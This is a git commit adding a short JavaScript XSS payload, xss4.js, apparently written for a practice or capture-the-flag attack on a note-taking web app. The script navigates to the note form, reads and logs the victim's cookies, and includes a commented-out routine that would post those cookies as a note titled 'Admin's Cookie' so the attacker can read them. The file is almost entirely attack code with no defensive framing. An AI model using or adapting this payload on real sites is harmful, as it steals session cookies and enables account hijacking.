bd2fde8daf24237581ba20fddcbf78dbf297344b
Yegor <36862422+yCherny@users.noreply.github.com>
2022-09-20 08:13:51 -0400

    Create xss4.js
    Fixes

---
+++ xss4.js
@@ -0,0 +1,47 @@
+// Move to Note Making Page
+const navBarElements = document.getElementsByClassName("nav-item");
+const newButton = navBarElements[2];
+for (const child of newButton.children) {
+  child.click();
+}
+
+const currentCookies = document.cookie;
+console.log(currentCookies);
+
+const formElements = document.getElementsByClassName("form-group required");
+const title = formElements[0];
+for (const child of title.children) {
+  console.log(child.textContent);
+}
+
+// // Submitting Form Data
+// const form = document.forms[0]
+// form.addEventListener(
+//   "submit",
+//   (event) => {
+    
+//     const output = document.querySelector("output");
+//     const data = new FormData(form);
+    
+    
+//     data.append("title", "Admin's Cookie");
+//     data.append("content", currentCookies);
+    
+//     const request = new XMLHttpRequest();
+//     request.open("POST", "view/1", true);
+//     request.onload = (progress) => {
+//       output.innerHTML = (request.status === 200 ? "Form Submitted" : `Error: Something Went Wrong`);
+//     };
+    
+//     request.send(data);
+//     event.preventDefault();
+//   },
+//   false
+// );
+
+// // Input Exploited Data into Form Fields
+// document.getElementById("title").click();
+// document.getElementById("content").click();
+
+// // Submit
+// document.getElementById("submit").click();
